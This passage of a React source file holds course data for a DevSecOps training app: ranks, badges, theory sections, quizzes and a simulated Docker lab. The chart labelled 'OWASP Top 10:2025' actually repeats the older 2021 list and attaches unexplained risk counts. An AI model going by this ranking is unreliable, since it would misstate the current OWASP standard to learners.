import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import {
  Shield, Terminal, BookOpen, Trophy, ChevronRight, ChevronDown, Copy, Check,
  Lock, Unlock, Star, Flame, User, Search, ExternalLink, Play, Award, Target,
  Zap, Database, Server, GitBranch, FileCode, AlertTriangle, CheckCircle,
  XCircle, BarChart3, Clock, ArrowRight, RefreshCw, Menu, X, Eye, EyeOff,
  Folder, File, Hash, Brain, Map, Layers, Printer, Share2, StickyNote, Download,
  Sun, Moon, Upload
} from 'lucide-react';

// ============================================================================
// DATA: RANKS
// ============================================================================
const RANKS = [
  { minXP: 0, name: 'Recruit', icon: '▪', tagline: 'Welcome to the academy' },
  { minXP: 200, name: 'Cadet', icon: '◆', tagline: 'Learning the basics' },
  { minXP: 500, name: 'Analyst', icon: '◈', tagline: 'Getting dangerous' },
  { minXP: 1000, name: 'Operator', icon: '★', tagline: 'Can secure a pipeline' },
  { minXP: 2000, name: 'Specialist', icon: '✦', tagline: 'Multi-tool expert' },
  { minXP: 3500, name: 'Engineer', icon: '⬡', tagline: 'Pipeline architect' },
  { minXP: 5000, name: 'Architect', icon: '◉', tagline: 'DevSecOps leader' },
  { minXP: 6500, name: 'Elite', icon: '⚡', tagline: 'Interview ready' },
];

const getRank = (xp) => {
  for (let i = RANKS.length - 1; i >= 0; i--) {
    if (xp >= RANKS[i].minXP) return RANKS[i];
  }
  return RANKS[0];
};

const getNextRank = (xp) => {
  for (let i = 0; i < RANKS.length; i++) {
    if (xp < RANKS[i].minXP) return RANKS[i];
  }
  return null;
};

// ============================================================================
// DATA: BADGES
// ============================================================================
const BADGES = [
  { id: 'first-scan', name: 'First Scan', desc: 'Complete any scanning lab simulation', icon: '🔍' },
  { id: 'secret-keeper', name: 'Secret Keeper', desc: 'Complete Module 2.1', icon: '🔐' },
  { id: 'pipeline-builder', name: 'Pipeline Builder', desc: 'Complete any CI/CD module (3.1-3.5)', icon: '🔧' },
  { id: 'full-stack-scanner', name: 'Full Stack Scanner', desc: 'Complete ALL of Path 2', icon: '🎯' },
  { id: 'quiz-master', name: 'Quiz Master', desc: 'Score 5/5 on any 10 quizzes', icon: '🧠' },
  { id: 'terminal-warrior', name: 'Terminal Warrior', desc: 'Master 40+ terminal commands', icon: '⌨️' },
  { id: 'vault-guardian', name: 'Vault Guardian', desc: 'Complete Module 4.1', icon: '🏦' },
  { id: 'policy-enforcer', name: 'Policy Enforcer', desc: 'Complete Module 4.3', icon: '📜' },
  { id: 'scenario-survivor', name: 'Scenario Survivor', desc: 'Complete ALL of Path 5', icon: '🎖️' },
  { id: 'academy-graduate', name: 'Academy Graduate', desc: 'Complete ALL 5 paths', icon: '🎓' },
];

// ============================================================================
// DATA: PATHS
// ============================================================================
const PATHS = [
  {
    id: 1, name: 'DevSecOps Fundamentals', icon: '🛡️', difficulty: 'Beginner',
    color: '#3B82F6', desc: 'Build your foundation — Docker, Git, CI/CD concepts, and the security mindset.',
    moduleIds: ['1.1','1.2','1.3','1.4','1.5','1.6'], prerequisite: null,
  },
  {
    id: 2, name: 'Security Scanning & Testing', icon: '🎯', difficulty: 'Beginner-Intermediate',
    color: '#A78BFA', desc: 'Master the tools — secrets detection, SAST, SCA, container scanning, DAST, IaC.',
    moduleIds: ['2.1','2.2','2.3','2.4','2.5','2.6'], prerequisite: 1,
  },
  {
    id: 3, name: 'CI/CD Pipeline Security', icon: '🔀', difficulty: 'Intermediate',
    color: '#A78BFA', desc: 'Build secure pipelines — Jenkins, GitLab CI, GitHub Actions, full pipeline design.',
    moduleIds: ['3.1','3.2','3.3','3.4','3.5'], prerequisite: 2,
  },
  {
    id: 4, name: 'Advanced DevSecOps', icon: '⚡', difficulty: 'Advanced',
    color: '#F59E0B', desc: 'Go deep — Vault, Kubernetes, OPA, SonarQube, supply chain, runtime security.',
    moduleIds: ['4.1','4.2','4.3','4.4','4.5','4.6'], prerequisite: 3,
  },
  {
    id: 5, name: 'Interview Prep & Scenarios', icon: '🏆', difficulty: 'All Levels',
    color: '#a855f7', desc: 'Get interview-ready — core questions, incident scenarios, architecture frameworks.',
    moduleIds: ['5.1','5.2','5.3','5.4','5.5','5.6'], prerequisite: null,
  },
];

// ============================================================================
// DATA: ALL 28 MODULES (theory, simulation, execute, verify, quiz)
// ============================================================================
const MODULES = {
  '1.1': {
    id: '1.1', pathId: 1, title: 'What is DevSecOps?', baseXP: 80, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'The Evolution', blocks: [
          { type: 'text', content: 'Software development has evolved through four major eras. Each solved a real problem, but security kept getting left behind — until DevSecOps.' },
          { type: 'timeline', items: [
            { label: 'Waterfall', year: '1970s', desc: 'Sequential phases. Security was a final gate before release — found too late, expensive to fix.' },
            { label: 'Agile', year: '2001', desc: 'Iterative development. Faster releases, but security reviews couldn\'t keep pace with 2-week sprints.' },
            { label: 'DevOps', year: '2009', desc: 'Dev + Ops united. Automated deployments, but security was still a separate team called in at the end.' },
            { label: 'DevSecOps', year: '2012+', desc: 'Security embedded into every stage. Automated scanning, shared responsibility, no more "security as a bottleneck."' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'What is DevSecOps?', content: 'DevSecOps = Development + Security + Operations. It means making security a first-class citizen in every stage of the software lifecycle — not something bolted on at the end.' },
        ]},
        { heading: 'Shift Left', blocks: [
          { type: 'text', content: '"Shift Left" is the most important concept in DevSecOps. It means moving security testing earlier in the development lifecycle — from production all the way back to design and coding.' },
          { type: 'cost-chart', items: [
            { stage: 'Design', multiplier: 1, color: '#22C55E' },
            { stage: 'Development', multiplier: 6, color: '#3B82F6' },
            { stage: 'Testing', multiplier: 15, color: '#F59E0B' },
            { stage: 'Production', multiplier: 100, color: '#EF4444' },
          ]},
          { type: 'text', content: 'A vulnerability found during design costs 1x to fix. The same vulnerability found in production costs 100x — because it now involves incident response, emergency patches, testing, deployment, potential downtime, customer impact, and reputation damage.' },
          { type: 'callout', variant: 'tip', content: 'The goal isn\'t to eliminate all bugs in design. It\'s to catch as many as possible as early as possible using automated tools at every stage.' },
        ]},
        { heading: 'The Three Pillars', blocks: [
          { type: 'text', content: 'DevSecOps stands on three pillars. All three must work together — you cannot buy your way to security with tools alone.' },
          { type: 'comparison', items: [
            { title: 'People', color: '#3B82F6', points: ['Security Champions in each team', 'Shared responsibility for security', 'Blameless culture — learn from incidents', 'Regular security training and awareness'] },
            { title: 'Process', color: '#A78BFA', points: ['Automated security gates in CI/CD', 'Severity-based SLAs for fixing vulns', 'Blameless postmortems after incidents', 'Regular dependency update cycles'] },
            { title: 'Technology', color: '#22C55E', points: ['SAST, DAST, SCA scanning tools', 'Secrets detection in pre-commit hooks', 'Container image scanning', 'Policy-as-Code enforcement'] },
          ]},
        ]},
        { heading: 'DevSecOps Lifecycle', blocks: [
          { type: 'text', content: 'Security touchpoints exist at every stage of the software lifecycle. Here\'s what security looks like at each stage:' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Plan', note: 'Threat modeling' },
            { label: 'Code', note: 'IDE plugins, linting' },
            { label: 'Build', note: 'SAST, SCA scanning' },
            { label: 'Test', note: 'DAST, pen testing' },
            { label: 'Release', note: 'Sign & verify' },
            { label: 'Deploy', note: 'IaC scanning' },
            { label: 'Operate', note: 'Runtime security' },
            { label: 'Monitor', note: 'SIEM, alerts' },
          ]},
          { type: 'callout', variant: 'key-concept', content: 'The key insight: security is not a stage — it\'s a continuous activity that happens at every stage. DevSecOps pipelines automate these checks so developers get instant feedback.' },
        ]},
        { heading: 'Before vs After DevSecOps', blocks: [
          { type: 'comparison', items: [
            { title: 'Without DevSecOps', color: '#EF4444', points: [
              'Security team reviews code manually at the end',
              'Weeks of delay before release approval',
              'Developers and security in adversarial relationship',
              'Vulnerabilities found in production (expensive)',
              'No visibility into security posture',
            ]},
            { title: 'With DevSecOps', color: '#22C55E', points: [
              'Automated scanning in every pull request',
              'Fast feedback in seconds to minutes',
              'Shared responsibility, collaborative culture',
              'Vulnerabilities caught in development (cheap)',
              'Real-time dashboard of security metrics',
            ]},
          ]},
        ]},
        { heading: 'Why This Matters', blocks: [
          { type: 'callout', variant: 'warning', content: 'Culture change is the hardest part. Tools are easy to install. Getting an entire development team to care about security — that\'s the real challenge. DevSecOps succeeds when security becomes everyone\'s job, not just the security team\'s.' },
          { type: 'text', content: 'The good news: modern DevSecOps tools are designed to be developer-friendly. They integrate into the tools developers already use (IDEs, Git, CI/CD) and provide fast, actionable feedback rather than lengthy security reports.' },
        ]},
        { heading: 'Real-World Example', blocks: [
          { type: 'callout', variant: 'example', title: 'Equifax Breach (2017) — $575 Million', content: '147 million records exposed because a known vulnerability in Apache Struts (CVE-2017-5638) went unpatched for months. The patch was available. The vulnerability was public. But there was no automated process to detect and remediate it.' },
          { type: 'steps', steps: [
            { label: 'March 2017: Vulnerability disclosed', detail: 'Apache Struts CVE-2017-5638 published with a severity score of 10.0 (maximum).' },
            { label: 'Months pass — no patch applied', detail: 'Equifax had no automated dependency scanning. The vulnerable component went unnoticed.' },
            { label: 'May-July 2017: Attackers exploit', detail: 'Attackers used the known vulnerability to access 147 million customer records.' },
            { label: 'The DevSecOps solution', detail: 'An SCA tool (like Trivy or Grype) in the CI/CD pipeline would have flagged this dependency as critically vulnerable within hours of the CVE being published.' },
          ]},
        ]},
        { heading: 'Key Terms to Remember', blocks: [
          { type: 'keyterms', terms: [
            { term: 'DevSecOps', definition: 'Development + Security + Operations — embedding security into every stage of the software lifecycle.' },
            { term: 'Shift Left', definition: 'Moving security testing earlier in development. Earlier detection = cheaper fixes.' },
            { term: 'Security Champion', definition: 'A developer who advocates for security within their feature team, bridging dev and security.' },
            { term: 'SAST', definition: 'Static Application Security Testing — analyzes source code for vulnerabilities without running it.' },
            { term: 'SCA', definition: 'Software Composition Analysis — checks third-party dependencies for known CVEs.' },
            { term: 'DAST', definition: 'Dynamic Application Security Testing — tests the running application for vulnerabilities.' },
            { term: 'CVE', definition: 'Common Vulnerabilities and Exposures — a standardized ID for publicly known security vulnerabilities.' },
          ]},
        ]},
      ],
    },
    simulation: null,
    execute: null,
    verify: null,
    quiz: [
      { q: "What does 'Shift Left' mean in DevSecOps?", opts: ["Move deployment earlier", "Move security testing earlier in the lifecycle", "Use left-aligned code formatting", "Shift team structure to the left"], answer: 1, explanation: "Shift Left means integrating security testing as early as possible — during design and coding, not waiting until deployment." },
      { q: "Which is NOT one of the three pillars of DevSecOps?", opts: ["People", "Process", "Technology", "Profitability"], answer: 3, explanation: "The three pillars are People, Process, and Technology. Profitability is a business goal, not a DevSecOps pillar." },
      { q: "Why is fixing a bug in production ~100x more expensive than in design?", opts: ["Production servers cost more", "It requires more people, incident response, rollbacks, and potential customer impact", "Bugs in production are harder to find", "You have to pay overtime"], answer: 1, explanation: "Production fixes involve incident response, emergency patches, testing, deployment, potential downtime, customer impact, and reputation damage." },
      { q: "What is a Security Champion?", opts: ["The CISO", "A developer who advocates for security within their team", "An automated security tool", "The most senior security engineer"], answer: 1, explanation: "Security Champions are developers embedded in feature teams who promote security practices and serve as a bridge to the security team." },
      { q: "DevSecOps is primarily about:", opts: ["Buying the best security tools", "Embedding security into culture, process, and automation", "Hiring more security engineers", "Running penetration tests more often"], answer: 1, explanation: "Tools help, but DevSecOps is fundamentally about making security everyone's responsibility through culture, process changes, and automation." },
    ],
  },
  '1.2': {
    id: '1.2', pathId: 1, title: 'Understanding CI/CD Pipelines', baseXP: 80, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'Continuous Integration (CI)', blocks: [
          { type: 'text', content: 'Developers merge code to the main branch frequently. Each merge triggers an automated build + tests. This catches integration issues early before they compound.' },
          { type: 'callout', variant: 'key-concept', title: 'The Golden Rule of CI', content: 'Never leave the build broken. If a merge breaks the build, fixing it is the team\'s #1 priority. A broken build means no one can ship.' },
        ]},
        { heading: 'Continuous Delivery vs Deployment', blocks: [
          { type: 'comparison', items: [
            { title: 'Continuous Delivery', color: '#3B82F6', points: ['Code is always in a deployable state', 'Deployment requires manual approval', 'Good for regulated industries', 'Team controls when releases happen'] },
            { title: 'Continuous Deployment', color: '#22C55E', points: ['Every passing build auto-deploys to production', 'Fully automated — no human gates', 'Requires excellent test coverage', 'Fastest path from commit to customer'] },
          ]},
          { type: 'text', content: 'Most teams start with Continuous Delivery and graduate to Continuous Deployment as their test coverage and confidence grow.' },
        ]},
        { heading: 'Pipeline Stages', blocks: [
          { type: 'text', content: 'A CI/CD pipeline is a series of automated stages. Each stage acts as a quality gate — if it fails, the pipeline stops and the team is notified.' },
          { type: 'pipeline', stages: [
            { label: 'Source', icon: '📥', desc: 'git push triggers', security: false },
            { label: 'Build', icon: '🔨', desc: 'Compile, Docker build', security: false },
            { label: 'Test', icon: '🧪', desc: 'Unit, integration', security: false },
            { label: 'Scan', icon: '🔍', desc: 'SAST, SCA, secrets', security: true, tool: 'DevSecOps' },
            { label: 'Stage', icon: '🎭', desc: 'Deploy to staging', security: false },
            { label: 'DAST', icon: '🎯', desc: 'Dynamic testing', security: true, tool: 'ZAP' },
            { label: 'Approve', icon: '✅', desc: 'Quality gate', security: true },
            { label: 'Deploy', icon: '🚀', desc: 'Production', security: false },
          ]},
          { type: 'callout', variant: 'tip', content: 'Notice the green-highlighted stages — those are where DevSecOps adds security. Without them, the pipeline only checks functionality, not safety.' },
        ]},
        { heading: 'Pipeline as Code', blocks: [
          { type: 'callout', variant: 'key-concept', title: 'Pipeline as Code', content: 'Your pipeline configuration lives in a file (Jenkinsfile, .gitlab-ci.yml, workflow YAML) that\'s version-controlled alongside your app code. Your pipeline IS code — it should be reviewed, tested, and secured like any other code.' },
          { type: 'scan-output', tool: '.gitlab-ci.yml', title: 'Example Pipeline Config', findings: [
            { type: 'header', text: 'stages:\\n  - build\\n  - test\\n  - security-scan\\n  - deploy' },
            { type: 'header', text: '\\nsecurity-scan:\\n  stage: security-scan\\n  script:\\n    - gitleaks detect --report-format sarif\\n    - semgrep scan --config auto --sarif\\n    - trivy fs . --format sarif\\n  artifacts:\\n    reports:\\n      sast: gl-sast-report.json' },
          ]},
        ]},
        { heading: 'Artifacts', blocks: [
          { type: 'text', content: 'Artifacts are files produced by one stage and consumed by another — compiled binaries, Docker images, test reports, security scan results. Artifacts make pipelines reproducible and auditable.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Build', note: 'Produces Docker image' },
            { label: 'Test', note: 'Produces test report' },
            { label: 'Scan', note: 'Produces SARIF report' },
            { label: 'Deploy', note: 'Uses Docker image' },
            { label: 'Archive', note: 'Stores all reports' },
          ]},
        ]},
        { heading: 'CI/CD Platforms Compared', blocks: [
          { type: 'comparison', items: [
            { title: 'Jenkins', color: '#F59E0B', points: ['Self-hosted, most flexible', 'Jenkinsfile (Groovy)', 'Plugin ecosystem', 'Best for enterprise/custom'] },
            { title: 'GitLab CI', color: '#A78BFA', points: ['Built into GitLab', '.gitlab-ci.yml (YAML)', 'Built-in security templates', 'Best for GitLab-native teams'] },
            { title: 'GitHub Actions', color: '#3B82F6', points: ['Built into GitHub', '.github/workflows/*.yml', 'Huge marketplace', 'Best for open source'] },
          ]},
        ]},
      ],
    },
    simulation: null, execute: null, verify: null,
    quiz: [
      { q: "What is the difference between Continuous Delivery and Continuous Deployment?", opts: ["They are the same thing", "Delivery requires manual approval to deploy; Deployment is fully automatic", "Delivery is faster", "Deployment only works with Docker"], answer: 1, explanation: "Continuous Delivery means code is always deployable but needs manual approval. Continuous Deployment automatically pushes every passing build to production." },
      { q: "What triggers a CI pipeline?", opts: ["A manual button click only", "A code change pushed to the repository", "A calendar schedule only", "An email from the project manager"], answer: 1, explanation: "CI pipelines are typically triggered by git push events — when developers push code changes to the repository." },
      { q: "What is 'Pipeline as Code'?", opts: ["Writing code inside a pipeline", "Defining pipeline configuration in a version-controlled file", "Using code to replace pipelines", "A type of programming language"], answer: 1, explanation: "Pipeline as Code means your CI/CD configuration lives in a file (Jenkinsfile, .gitlab-ci.yml) that's committed to your repo and reviewed like any other code change." },
      { q: "Where do security scans fit in a typical CI/CD pipeline?", opts: ["Only at the very end", "Only before coding begins", "After build and before/during deploy — and ideally at multiple stages", "Security scans don't belong in pipelines"], answer: 2, explanation: "Security scans should be integrated at multiple pipeline stages: secrets detection early, SAST/SCA after build, DAST after deployment to staging." },
      { q: "What is a build artifact?", opts: ["A bug in the code", "A file produced by one pipeline stage for use by another", "An old, deprecated feature", "A Docker container"], answer: 1, explanation: "Artifacts are outputs from pipeline stages — compiled binaries, Docker images, test reports, security scan results — passed between stages or archived." },
    ],
  },
  '1.3': {
    id: '1.3', pathId: 1, title: 'Security Threats in Software Development', baseXP: 80, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'OWASP Top 10 (2025)', blocks: [
          { type: 'text', content: 'The OWASP Top 10 (2025 edition) is the most widely recognized list of critical web application security risks. Updated to reflect modern threats including AI and supply chain risks:' },
          { type: 'severity-bars', title: 'OWASP Top 10:2025 — Ranked by Risk', items: [
            { rank: 'A01', label: 'Broken Access Control', count: 94, color: '#EF4444' },
            { rank: 'A02', label: 'Cryptographic Failures', count: 82, color: '#EF4444' },
            { rank: 'A03', label: 'Injection (SQLi, XSS, SSTI)', count: 76, color: '#F97316' },
            { rank: 'A04', label: 'Insecure Design', count: 70, color: '#F97316' },
            { rank: 'A05', label: 'Security Misconfiguration', count: 64, color: '#F59E0B' },
            { rank: 'A06', label: 'Vulnerable & Outdated Components', count: 60, color: '#F59E0B' },
            { rank: 'A07', label: 'Identity & Authentication Failures', count: 52, color: '#3B82F6' },
            { rank: 'A08', label: 'Software & Data Integrity Failures', count: 44, color: '#3B82F6' },
            { rank: 'A09', label: 'Security Logging & Monitoring Failures', count: 38, color: '#A78BFA' },
            { rank: 'A10', label: 'Server-Side Request Forgery (SSRF)', count: 30, color: '#A78BFA' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Focus on the top 3: Broken Access Control, Cryptographic Failures, and Injection. These account for the vast majority of real-world breaches. The 2025 update emphasizes supply chain risks (A06, A08) more heavily than previous editions.' },
        ]},
        { heading: 'Supply Chain Attacks', blocks: [
          { type: 'text', content: 'Supply chain attacks target upstream dependencies and build tools. One compromised component can affect thousands of organizations downstream.' },
          { type: 'attack-flow', steps: [
            { type: 'attack', label: 'SolarWinds (2020)', detail: 'Attackers compromised the build pipeline and injected a backdoor into legitimate software updates. 18,000+ organizations received the malicious update, including US government agencies.' },
            { type: 'attack', label: 'Log4Shell (2021)', detail: 'A critical RCE vulnerability (CVSS 10.0) in Apache Log4j, a logging library used by millions of Java applications. Exploitation was trivial — just send a crafted string.' },
            { type: 'attack', label: 'Codecov (2021)', detail: 'Attackers modified the Codecov bash uploader script to steal environment variables (secrets, tokens) from CI systems of thousands of companies.' },
            { type: 'defense', label: 'DevSecOps Defense', detail: 'SCA scanning (Trivy, Grype) detects known vulnerabilities in dependencies. SBOM generation provides full component inventory. Image signing verifies build integrity.' },
          ]},
        ]},
        { heading: 'Secrets Leakage', blocks: [
          { type: 'callout', variant: 'example', title: 'Uber Breach (2016) — $148M Settlement', content: 'A developer committed AWS access keys to a GitHub repository. Attackers used those keys to access an S3 bucket containing 57 million customer and driver records. The breach went undisclosed for over a year.' },
          { type: 'scan-output', tool: 'gitleaks', title: 'What a Secrets Scan Looks Like', findings: [
            { type: 'finding', severity: 'CRITICAL', text: 'AWS Access Key ID found', file: 'config.py:5' },
            { type: 'finding', severity: 'HIGH', text: 'GitHub Personal Access Token', file: 'config.py:7' },
            { type: 'finding', severity: 'HIGH', text: 'Stripe API Key (live)', file: '.env:3' },
            { type: 'finding', severity: 'MEDIUM', text: 'Database password in plaintext', file: 'deployment.yaml:12' },
            { type: 'summary', text: '4 secrets found in 3 files — Gitleaks would have caught all of these before commit.' },
          ]},
          { type: 'callout', variant: 'warning', content: 'Bots scan GitHub in real-time for leaked credentials. A committed AWS key can be exploited within minutes. Deleting the commit is NOT enough — the key must be revoked immediately.' },
        ]},
        { heading: 'Container Misconfigurations', blocks: [
          { type: 'text', content: 'As a pentester, these are the first things I check when attacking containerized environments:' },
          { type: 'comparison', items: [
            { title: 'Insecure (What Attackers Love)', color: '#EF4444', points: [
              'Running containers as root (UID 0)',
              'Using "latest" tag (unpredictable)',
              'Docker socket exposed to containers',
              'No resource limits (CPU/memory)',
              'Privileged mode enabled',
            ]},
            { title: 'Secure (What Stops Attackers)', color: '#22C55E', points: [
              'Non-root user (UID 1000+)',
              'Pinned image versions (nginx:1.25)',
              'Docker socket never mounted',
              'CPU and memory limits set',
              'Capabilities dropped, read-only FS',
            ]},
          ]},
          { type: 'scan-output', tool: 'hadolint', title: 'Dockerfile Lint Results', findings: [
            { type: 'finding', severity: 'HIGH', text: 'DL3007: Using latest tag', file: 'Dockerfile:1' },
            { type: 'finding', severity: 'HIGH', text: 'DL3002: Last USER should not be root', file: 'Dockerfile:5' },
            { type: 'finding', severity: 'MEDIUM', text: 'DL3008: Pin versions in apt-get', file: 'Dockerfile:3' },
            { type: 'summary', text: 'Hadolint catches these misconfigs automatically in CI.' },
          ]},
        ]},
        { heading: 'Why This Matters', blocks: [
          { type: 'callout', variant: 'key-concept', content: 'Understanding threats is the foundation of defense. As a DevSecOps engineer, you\'re not just running tools — you\'re thinking like an attacker to build defenses. Every tool in this course is designed to catch one of the threat categories above.' },
          { type: 'keyterms', terms: [
            { term: 'OWASP', definition: 'Open Web Application Security Project — produces the Top 10 and other security guidance.' },
            { term: 'Supply Chain Attack', definition: 'Compromising an upstream dependency or build tool to affect all downstream consumers.' },
            { term: 'CVE', definition: 'Common Vulnerabilities and Exposures — a unique ID for each publicly known vulnerability.' },
            { term: 'CVSS', definition: 'Common Vulnerability Scoring System — rates severity from 0.0 (none) to 10.0 (critical).' },
          ]},
        ]},
      ],
    },
    simulation: null, execute: null, verify: null,
    quiz: [
      { q: "Which OWASP Top 10 category covers SQL Injection and XSS?", opts: ["A01 Broken Access Control", "A03 Injection", "A05 Security Misconfiguration", "A07 Authentication Failures"], answer: 1, explanation: "A03 Injection covers SQL injection, XSS, command injection, and other injection flaws where untrusted data is sent to an interpreter." },
      { q: "What happened in the Log4Shell incident?", opts: ["A DNS server was hacked", "A critical RCE vulnerability was found in a widely-used Java logging library", "A password database was leaked", "A cloud provider had an outage"], answer: 1, explanation: "Log4Shell (CVE-2021-44228) was a critical remote code execution vulnerability in Apache Log4j, a logging library used in millions of Java applications worldwide." },
      { q: "What is a supply chain attack?", opts: ["Attacking a company's delivery trucks", "Compromising a dependency or build tool that many organizations rely on", "Stealing products from a warehouse", "DDoS attack on a website"], answer: 1, explanation: "Supply chain attacks target upstream dependencies, build tools, or infrastructure that many downstream organizations use — one compromise affects thousands." },
      { q: "Why is running a container as root dangerous?", opts: ["It's slower", "If an attacker escapes the container, they have root access to the host", "Containers can't run as root", "It uses more memory"], answer: 1, explanation: "If a container runs as root and an attacker achieves container escape, they may gain root access to the underlying host system." },
      { q: "A developer accidentally commits an AWS access key to GitHub. What's the FIRST priority?", opts: ["Delete the commit from git history", "Rotate/revoke the AWS key immediately", "Run a security scan", "Notify the manager"], answer: 1, explanation: "The first priority is ALWAYS to revoke/rotate the compromised credential. Even if you delete the commit, bots scrape GitHub in real-time and may have already captured it." },
    ],
  },
  '1.4': {
    id: '1.4', pathId: 1, title: 'Docker Fundamentals', baseXP: 80, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Containers vs VMs', blocks: [
          { type: 'text', content: 'Containers and virtual machines both provide isolation, but they work very differently:' },
          { type: 'comparison', items: [
            { title: 'Virtual Machines', color: '#F59E0B', points: ['Each VM runs a full OS (Linux, Windows)', 'Strong isolation — separate kernel per VM', 'Heavy — GBs of disk, minutes to start', 'Managed by hypervisor (VMware, Hyper-V)'] },
            { title: 'Containers', color: '#3B82F6', points: ['Share the host OS kernel', 'Lighter isolation — namespaces + cgroups', 'Light — MBs of disk, seconds to start', 'Managed by container runtime (Docker)'] },
          ]},
          { type: 'callout', variant: 'key-concept', content: 'Docker uses Linux namespaces (what a process can see) and cgroups (what a process can use) to isolate containers. This is lighter than VMs but means a kernel vulnerability could affect all containers on the host.' },
        ]},
        { heading: 'Docker Architecture', blocks: [
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'CLI', note: 'docker commands' },
            { label: 'Daemon', note: 'Background service' },
            { label: 'Images', note: 'Read-only templates' },
            { label: 'Containers', note: 'Running instances' },
            { label: 'Registry', note: 'Docker Hub, ECR' },
          ]},
          { type: 'keyterms', terms: [
            { term: 'Docker Image', definition: 'A read-only template containing your app code, dependencies, and OS. Built from a Dockerfile.' },
            { term: 'Container', definition: 'A running instance of an image. You can have many containers from one image.' },
            { term: 'Registry', definition: 'Where images are stored — Docker Hub (public), ECR/GCR (private cloud).' },
            { term: 'Dockerfile', definition: 'A text file with instructions to build an image (FROM, RUN, COPY, CMD).' },
          ]},
        ]},
        { heading: 'Image Layers & Caching', blocks: [
          { type: 'text', content: 'Each Dockerfile instruction creates a layer. Docker caches layers and only rebuilds changed ones. This means the ORDER of instructions matters for build speed:' },
          { type: 'steps', steps: [
            { label: 'FROM python:3.12-slim', detail: 'Base layer — rarely changes, always cached.' },
            { label: 'RUN apt-get install...', detail: 'OS dependencies — changes rarely, cache hit most builds.' },
            { label: 'COPY requirements.txt && RUN pip install', detail: 'App dependencies — only rebuilds when requirements change.' },
            { label: 'COPY . .', detail: 'Your source code — changes every build, so put it LAST.' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Put the least-changing instructions first. If you put COPY . . before RUN pip install, Docker will reinstall ALL dependencies every time you change any source file.' },
        ]},
        { heading: 'Base Image Security', blocks: [
          { type: 'text', content: 'Your base image choice directly impacts security. Fewer packages = fewer vulnerabilities:' },
          { type: 'severity-bars', title: 'Image Size vs Attack Surface', items: [
            { rank: '🔴', label: 'python:3.12 (full)', count: 900, color: '#EF4444' },
            { rank: '🟡', label: 'python:3.12-slim', count: 150, color: '#F59E0B' },
            { rank: '🟢', label: 'python:3.12-alpine', count: 50, color: '#22C55E' },
          ]},
          { type: 'callout', variant: 'warning', content: 'The full python:3.12 image contains hundreds of packages you don\'t need — each one is a potential vulnerability. Always use -slim or -alpine for production.' },
        ]},
        { heading: 'Docker Security Checklist', blocks: [
          { type: 'comparison', items: [
            { title: 'Do This', color: '#22C55E', points: [
              'Pin specific version tags (nginx:1.25)',
              'Run as non-root USER',
              'Use .dockerignore for secrets',
              'Set memory and CPU limits',
              'Use multi-stage builds',
            ]},
            { title: 'Never Do This', color: '#EF4444', points: [
              'Use :latest tag in production',
              'Run containers as root',
              'COPY secrets into images',
              'Run without resource limits',
              'Install unnecessary packages',
            ]},
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Your First Container Lab',
      scenario: "You're setting up a development environment. Your task: pull images, run containers, inspect them, and understand the basics.",
      files: {
        'project/': {
          'app.py': 'from flask import Flask\n\napp = Flask(__name__)\n\n@app.route("/")\ndef hello():\n    return "Hello from SecOps Academy!"\n\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", port=5000)',
          'requirements.txt': 'flask==3.0.0\ngunicorn==21.2.0',
          'Dockerfile': 'FROM python:3.12-slim\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\nCOPY . .\nEXPOSE 5000\nCMD ["python3", "app.py"]',
        },
      },
      steps: [
        { objective: 'Check that Docker is installed', command: 'docker --version', output: 'Docker version 24.0.7, build afdd53b4e3', followUp: 'Is Docker installed? (yes/no)', answer: 'yes', hint: 'Type: docker --version' },
        { objective: 'Run your first container', command: 'docker run hello-world', output: 'Hello from Docker!\nThis message shows that your installation appears to be working correctly.\n\nTo generate this message, Docker took the following steps:\n 1. The Docker client contacted the Docker daemon.\n 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.\n 3. The Docker daemon created a new container from that image which runs the\n    executable that produces the output you are currently reading.\n 4. The Docker daemon streamed that output to the Docker client, which sent it\n    to your terminal.\n\nRuntime: runc', followUp: 'What runtime was used? (runc/containerd/podman)', answer: 'runc', hint: 'Look at the last line of the output' },
        { objective: 'Run an Alpine container interactively', command: 'docker run --rm -it alpine:latest sh', output: '/ # (Alpine shell ready)\n/ # Type "exit" to leave', followUp: 'What flag makes the container auto-remove after exit?', answer: '--rm', hint: 'Type: docker run --rm -it alpine:latest sh' },
        { objective: 'List all local Docker images', command: 'docker images', output: 'REPOSITORY    TAG       IMAGE ID       CREATED        SIZE\nalpine        latest    05455a08881e   2 weeks ago    7.38MB\nhello-world   latest    d2c94e258dcb   9 months ago   13.3kB', followUp: 'Which image is smallest?', answer: 'hello-world', hint: 'Type: docker images' },
        { objective: 'Run Nginx in the background on port 8080', command: 'docker run -d -p 8080:80 nginx:latest', output: 'Unable to find image \'nginx:latest\' locally\nlatest: Pulling from library/nginx\nStatus: Downloaded newer image for nginx:latest\nf7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8', followUp: 'What flag maps port 8080 on host to port 80 in container?', answer: '-p', hint: 'Type: docker run -d -p 8080:80 nginx:latest' },
        { objective: 'Check what containers are running', command: 'docker ps', output: 'CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS                  NAMES\nf7a8b9c0d1e2   nginx:latest   "/docker-entrypoint.…"   15 seconds ago   Up 14 seconds   0.0.0.0:8080->80/tcp   mystifying_tesla', followUp: 'What status does the nginx container show?', answer: 'up', hint: 'Type: docker ps' },
      ],
    },
    execute: {
      intro: 'Open your terminal and run these commands on your laptop to experience Docker for real.',
